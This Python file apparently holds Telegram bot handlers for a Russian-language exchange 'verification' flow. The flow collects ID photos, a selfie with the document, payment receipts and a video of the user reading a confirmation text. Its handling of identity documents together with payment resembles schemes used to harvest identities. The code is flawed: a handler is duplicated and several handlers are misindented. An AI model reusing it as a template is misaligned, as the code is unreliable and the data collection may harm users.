from aiogram import types
from aiogram.dispatcher import FSMContext, Dispatcher

from states.verification import VerificationFSM
from keyboards.reply_common import cancel_keyboard
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from keyboards.reply_user import get_user_menu
from utils.notifier import notify_group
from utils.media_saver import save_file
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from database.db import (
    create_verification,
    update_verification,
    set_verification_status,
    get_verification_status,
    is_verified
)

def get_valid_payment_file(msg: types.Message):
    if msg.photo:
        return msg.photo[-1]
    if msg.document:
        mime = msg.document.mime_type or ""
        if mime.startswith("image/") or mime == "application/pdf":
            return msg.document
    return None



def get_continue_keyboard():
    return ReplyKeyboardMarkup(resize_keyboard=True).add(
        KeyboardButton("❌ Отмена"),
        KeyboardButton("▶️ Продолжить")
    )


def get_retry_keyboard(text="🔁 Повторить шаг"):
    return ReplyKeyboardMarkup(resize_keyboard=True).add(
        KeyboardButton(text),
        KeyboardButton("🏠 В начало")
    )

def get_submit_reply_keyboard():
    return ReplyKeyboardMarkup(resize_keyboard=True).add(
        KeyboardButton("📤 Отправить документы"),
        KeyboardButton("❌ Отмена")
    )


def register_user_verification(dp: Dispatcher):

    @dp.message_handler(commands="debug")
    async def debug(msg: types.Message, state: FSMContext):
        current = await state.get_state()
        await msg.answer(f"Текущее состояние: {current}")


    @dp.message_handler(text="✅ Пройти верификацию")
    async def start_verification(msg: types.Message, state: FSMContext):
        create_verification(msg.from_user.id)

        await msg.answer(
            "👀 Добро пожаловать в процесс верификации!\n\n"
            "Перед тем как мы сможем продолжить, пожалуйста, пройдите обязательную проверку личности.\n\n"
            "Это необходимо для вашей безопасности и защиты от мошенничества.\n\n"
            "Процедура включает:\n"
            "1. Верификацию документа (паспорт или ID)\n"
            "2. Подтверждение оплаты\n"
            "3. Видео-верификацию\n\n"
            "⏭ Нажмите «▶️ Продолжить», чтобы начать.",
            reply_markup=get_continue_keyboard()
        )
        await VerificationFSM.waiting_agreement.set()

    @dp.message_handler(text="Написать в поддержку", state="*")
    async def handle_support_request(msg: types.Message, state: FSMContext):
        await state.finish()

        keyboard = InlineKeyboardMarkup().add(
            InlineKeyboardButton("🔗 Онлайн-поддержка", url="https://t.me/bitcoinbox_support")
        )

        await msg.answer(
            "Если возникли сложности — не оставайтесь с ними один на один. Наша поддержка всегда рядом.",
            reply_markup=keyboard
        )

        await msg.answer("Выберите действие:", reply_markup=get_user_menu(is_verified(msg.from_user.id)))


    @dp.message_handler(text="❌ Отмена", state="*")
    async def handle_cancel(msg: types.Message, state: FSMContext):
        await state.finish()

        await msg.answer(
            "❌ Вы вернулись в начало.",
            reply_markup=get_user_menu(is_verified(msg.from_user.id))
        )


    @dp.message_handler(text="✅ Пройти верификацию")
    async def start_verification(msg: types.Message, state: FSMContext):
        create_verification(msg.from_user.id)
        await msg.answer(
            "👀 ВЕРИФИКАЦИЯ\n\nПеред отправкой средств клиент обязан пройти полную верификацию. Это защита от мошенничества и гарантия безопасности.\n\n🤫 Процедура верификации включает:\n- верификация документа\n- подтверждение платежной операции\n- видео-верификация",
            reply_markup=get_continue_keyboard()
        )
        await VerificationFSM.waiting_agreement.set()

    @dp.message_handler(text="▶️ Продолжить", state=VerificationFSM.waiting_agreement)
    async def step_agreement(msg: types.Message, state: FSMContext):
        await msg.answer(
            f"⚠️ {msg.from_user.first_name}, пожалуйста, внимательно ознакомьтесь с важной информацией перед продолжением:\n\n"
            "• Переводы принимаются **только с личных счетов физических лиц**\n"
            "• Средства принимаются **только от верифицированного клиента**\n"
            "• Несовпадение имени — это **возврат с комиссией**\n"
            "• Любая попытка обмана — **блокировка обслуживания**\n\n"
            "🚨 Сейчас активно используются мошеннические схемы. Будьте внимательны и проверяйте все детали перед отправкой средств.",
            reply_markup=get_continue_keyboard(),
            parse_mode="Markdown"
        )
        await VerificationFSM.waiting_warning_ack.set()

    @dp.message_handler(text="▶️ Продолжить", state=VerificationFSM.waiting_warning_ack)
    async def step_warning(msg: types.Message, state: FSMContext):
        # Примеры документа и селфи — альбомом
        media = [
            types.InputMediaPhoto(types.InputFile("img/2.jpg"), caption="Фото-пример №1 — паспорт или удостоверение личности с открытой страницей и данными заявки"),
            types.InputMediaPhoto(types.InputFile("img/1.jpg"), caption="Фото-пример №2 — селфи с документом в руках"),
        ]
        await msg.bot.send_media_group(chat_id=msg.chat.id, media=media)

        # Инструкция
        await msg.answer(
            "📸 Пожалуйста, пришлите **1 или 2 файла** (паспорт и селфи) **в одном сообщении или как альбом**.\n\n"
            "Допустимые форматы:\n"
            "• фото (рекомендуется)\n"
            "• видео\n\n"
            "❗️Если отправляете 2 файла — выделите оба и отправьте вместе одним сообщением.",
            reply_markup=cancel_keyboard,
            parse_mode="Markdown"
        )


        
        await state.update_data(collected_docs=[])
        await VerificationFSM.waiting_documents.set()


    @dp.message_handler(lambda m: m.text and "отправить документы" in m.text.lower(), state=VerificationFSM.waiting_documents)
    async def submit_documents(msg: types.Message, state: FSMContext):
        print(f"[DEBUG] Кнопка нажата от {msg.from_user.id}, текст: {msg.text!r}")
        print(f"[DEBUG] Текущее состояние: {await state.get_state()}")

        data = await state.get_data()
        files = data.get("collected_docs", [])

        if not files:
            await msg.answer("⚠️ Вы ещё не загрузили документы.")
            return

        user_id = msg.from_user.id
        path1 = await save_file(msg.bot, files[0], "docs", user_id)
        path2 = await save_file(msg.bot, files[1], "docs", user_id) if len(files) > 1 else path1

        update_verification(user_id, "doc_photo", path1)
        update_verification(user_id, "selfie_photo", path2)
        set_verification_status(user_id, "new")

        await msg.answer("📬 Документы приняты. Ожидайте проверки оператором.", reply_markup=types.ReplyKeyboardRemove())
        await notify_group(msg.bot, f"📄 Клиент {user_id} загрузил документы.", user_id=user_id)

        await state.finish()
        print(f"[DEBUG] Завершено. Документы {user_id} переданы.")

    @dp.message_handler(content_types=types.ContentType.ANY, state=VerificationFSM.waiting_documents)
    async def collect_docs(msg: types.Message, state: FSMContext):
        # Не реагируем на кнопку "📤 Отправить документы"
        if msg.text and "отправить документы" in msg.text.lower():
            return

        file = msg.photo[-1] if msg.photo else msg.document or msg.video
        if not file:
            await msg.answer("❗ Пожалуйста, отправьте фото, видео или документ.")
            return

        data = await state.get_data()
        files = data.get("collected_docs", [])

        if len(files) >= 2:
            await msg.answer("⚠️ Можно загрузить максимум 2 файла.")
            return

        files.append(file.file_id)
        await state.update_data(collected_docs=files)

        await msg.answer(
            "✅ Файл получен. Когда все файлы загружены — нажмите кнопку:",
            reply_markup=get_submit_reply_keyboard()
        )


    @dp.message_handler(content_types=types.ContentType.ANY, state=VerificationFSM.waiting_payment_proof)
    async def step_payment(msg: types.Message, state: FSMContext):
        allowed_types = (
            msg.photo[-1] if msg.photo else None,
            msg.document,
            msg.video,
            msg.video_note,
        )

        file = next((f for f in allowed_types if f), None)

        if not file:
            await msg.answer(
                "❗️Неверный формат файла. Пожалуйста, отправьте изображение, документ или видео подтверждения оплаты.",
                reply_markup=cancel_keyboard
            )
            return

        try:
            file_id = file.file_id
            path = await save_file(msg.bot, file_id, "payments", msg.from_user.id)

            update_verification(msg.from_user.id, "payment_proof", path)
            set_verification_status(msg.from_user.id, "paid_waiting")

            await msg.answer("✅ Чек получен и передан оператору. Ожидайте подтверждения.")
            await notify_group(msg.bot, f"💵 Клиент {msg.from_user.id} отправил файл в качестве подтверждения оплаты.", user_id=msg.from_user.id)

            await state.finish()
        except Exception as e:
            await msg.answer("⚠️ Ошибка при сохранении файла. Попробуйте отправить файл ещё раз.")
            print(f"[ERROR] Ошибка при сохранении файла: {e}")


    @dp.message_handler(content_types=types.ContentType.ANY, state=VerificationFSM.waiting_video)
    async def step_video(msg: types.Message, state: FSMContext):
        if msg.video:
            file = msg.video
        elif msg.video_note:
            file = msg.video_note
        elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("video/"):
            file = msg.document
        else:
            file = None

        if not file:
            await msg.answer(
                "❗ Пожалуйста, отправьте **видео-файл** (как видео или документ).\n"
                "Фото, аудио и другие типы файлов не принимаются.",
                reply_markup=cancel_keyboard,
                parse_mode="Markdown"
            )
            return

        try:
            file_id = file.file_id
            path = await save_file(msg.bot, file_id, "videos", msg.from_user.id)

            update_verification(msg.from_user.id, "video", path)
            set_verification_status(msg.from_user.id, "video_waiting")

            await msg.answer("📤 Видео получено и отправлено оператору. Ожидайте подтверждения.")
            await notify_group(msg.bot, f"🎥 Клиент {msg.from_user.id} отправил видео для верификации.", user_id=msg.from_user.id)

            await state.finish()

        except Exception as e:
            await msg.answer("⚠️ Ошибка при обработке файла.")
            print(f"[ERROR step_video]: {e}")


    # ==== Повторные шаги после отказа ====

    @dp.message_handler(text="📄 Загрузить документы заново")
    async def retry_documents(msg: types.Message, state: FSMContext):
        await state.finish()
        await state.reset_data()

        update_verification(msg.from_user.id, "doc_photo", "")
        update_verification(msg.from_user.id, "selfie_photo", "")
        set_verification_status(msg.from_user.id, "draft")

        media = [
            types.InputMediaPhoto(types.InputFile("img/2.jpg"), caption="Фото-пример №1 — паспорт или удостоверение личности с открытой страницей и данными заявки"),
            types.InputMediaPhoto(types.InputFile("img/1.jpg"), caption="Фото-пример №2 — селфи с документом в руках"),
        ]
        await msg.bot.send_media_group(chat_id=msg.chat.id, media=media)

        await msg.answer(
            "📸 Повторная загрузка документов.\n\n"
            "Пожалуйста, пришлите **1 или 2 файла** (паспорт и селфи) **в одном сообщении или как альбом**.\n\n"
            "Допустимые форматы:\n"
            "• фото (рекомендуется)\n"
            "• видео\n\n"
            "❗️Если отправляете 2 файла — выделите оба и отправьте вместе одним сообщением.",
            reply_markup=cancel_keyboard,
            parse_mode="Markdown"
        )

        await state.update_data(collected_docs=[])
        await VerificationFSM.waiting_documents.set()


    @dp.message_handler(text="💵 Загрузить чек заново")
    async def retry_payment(msg: types.Message, state: FSMContext):
        await state.finish()
        await state.reset_data()

        update_verification(msg.from_user.id, "payment_proof", "")
        set_verification_status(msg.from_user.id, "draft")

        await msg.answer(
            "📤 Повторная загрузка чека:\n\n"
            "Пожалуйста, пришлите **изображение, документ или видео**, подтверждающее оплату.\n\n"
            "Это может быть:\n"
            "• скрин из онлайн-банка\n"
            "• платёжное поручение\n"
            "• фото квитанции\n\n"
            "❗️Важно: на изображении должны быть чётко видны:\n"
            "— Имя отправителя\n"
            "— Счёт\n"
            "— Сумма\n"
            "— Дата и время перевода",
            reply_markup=cancel_keyboard
        )

        await VerificationFSM.waiting_payment_proof.set()

    @dp.message_handler(text="🎥 Загрузить видео заново")
    async def retry_video(msg: types.Message, state: FSMContext):
        await state.finish()
        await state.reset_data()

        update_verification(msg.from_user.id, "video", "")
        set_verification_status(msg.from_user.id, "draft")

        await msg.answer(
            "📹 Повторная запись видео.\n\n"
            "Запишите видео, где вы:\n"
            "• держите в руках документ, устройство с квитанцией и лист с номером обмена,\n"
            "• произносите вслух стандартный текст подтверждения.\n\n"
            "⚠️ Условия:\n"
            "• в кадре только вы\n"
            "• чёткое лицо и документ\n"
            "• без фильтров и монтажа\n"
            "• видео действительно только в день записи.",
            reply_markup=cancel_keyboard
        )

        await VerificationFSM.waiting_video.set()


        @dp.message_handler(text="🏠 В начало")
        async def back_to_start(msg: types.Message, state: FSMContext):
            await state.finish()
            await msg.answer(
                "🏠 Возврат в начало.\nНажмите кнопку ниже для старта верификации:",
                reply_markup=ReplyKeyboardMarkup(resize_keyboard=True).add(KeyboardButton("✅ Пройти верификацию"))
            )

        @dp.message_handler(content_types=[types.ContentType.PHOTO, types.ContentType.DOCUMENT])
        async def fallback_payment_handler(msg: types.Message):
            user_id = msg.from_user.id
            status = get_verification_status(user_id)

            # Разрешаем вне FSM загрузку чека, если статус уже paid_waiting
            if status != "paid_waiting":
                return

            file = msg.photo[-1] if msg.photo else msg.document
            file_id = file.file_id
            path = await save_file(msg.bot, file_id, "payments", user_id)

            update_verification(user_id, "payment_proof", path)

            await msg.answer("✅ Чек получен. Ожидайте подтверждения от оператора.")
            await notify_group(msg.bot, f"💵 Клиент {user_id} отправил чек.", user_id=user_id)

        @dp.message_handler(content_types=[types.ContentType.VIDEO, types.ContentType.DOCUMENT])
        async def fallback_video_handler(msg: types.Message):
            user_id = msg.from_user.id
            status = get_verification_status(user_id)

            if status != "video_waiting":
                return

            file = msg.video or msg.document
            file_id = file.file_id
            path = await save_file(msg.bot, file_id, "videos", user_id)

            update_verification(user_id, "video", path)

            await msg.answer("📤 Видео получено. Ожидайте подтверждения.")
            await notify_group(msg.bot, f"🎥 Клиент {user_id} отправил видео.", user_id=user_id)
